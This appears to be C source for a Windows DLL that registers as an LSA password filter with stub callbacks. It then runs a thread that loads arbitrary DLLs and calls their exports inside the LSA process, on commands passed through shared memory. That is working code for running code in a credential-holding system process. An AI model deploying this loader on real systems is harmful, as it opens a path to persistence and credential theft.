#include <windows.h>
#include <ntsecapi.h>
#include "../shared/shared.h"

static volatile int     unload_flag = 0;
static HANDLE           working_thread_handle = INVALID_HANDLE_VALUE;

typedef void (WINAPI * remote_t)(void);

const char dout_file[] = "lsamod.log";

static DWORD WINAPI working_thread(LPVOID param){
    shmem_ldr_t     *shmem;
    HANDLE          mutex;
    HMODULE         lib = NULL;

    if(!shmem_create((char**)&shmem, &mutex)){
        dout("Terminating working thread...\n");
        return 0;
    }

    ///

    while(unload_flag == 0){
        if(WaitForSingleObject(mutex, 100) != WAIT_TIMEOUT){

            switch(shmem->op){
            case LDROP_LOADLIB:
                {
                    ((char*)shmem)[sizeof(*shmem)] = 0;

                    if(lib != NULL) FreeLibrary(lib);

                    lib = LoadLibrary(shmem->data);
                    if(lib != NULL){
                        dout("A module has successfully been loaded.\n");
                    }else{
                        DOUTGLE("lsamod", "LoadLibrary");
                    }
                }
                shmem->op = LDROP_NOP;
                break;
            case LDROP_FREELIB:
                {
                    FreeLibrary(lib);
                    lib = NULL;
                    dout("The module has been freed.\n");
                }
                shmem->op = LDROP_NOP;
                break;
            case LDROP_CALLPROC:
                {
                    if(lib != NULL){
                        remote_t remote = (remote_t)GetProcAddress(lib, shmem->data);
                        if(remote){
                            remote();
                        }else{
                            DOUTGLE("lsamod", "GetProcAddress");
                        }
                    }else{
                        dout("Cannot call the procedure: no library has been loaded.\n");
                    }

                }

                shmem->op = LDROP_NOP;
                break;
            }

            ReleaseMutex(mutex);
        }

        Sleep(1000);  // do something else
    }

    ///

    shmem_close((char*)shmem, mutex);

    return 0;
}

/////////////////////////////////////////////

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch (fdwReason){
    case DLL_PROCESS_ATTACH:
        {
            DWORD tid;

            working_thread_handle = CreateThread(NULL, 0, working_thread, NULL, 0, &tid);
            if(working_thread_handle == NULL){
                DOUTGLE("ldr", "CreateThread");
            }

            return TRUE;
        }
    case DLL_PROCESS_DETACH:
        {
            unload_flag = 1;
            WaitForSingleObject(working_thread_handle, 1000);

            dout_close();

            return TRUE;
        }
    default:
        return TRUE;
    }
}

/////////////////////////////////////////////

BOOLEAN WINAPI InitializeChangeNotify(void){
    return TRUE;
}

NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword){
    return 0; //STATUS_SUCCESS;
}

BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation){
    return TRUE;
}

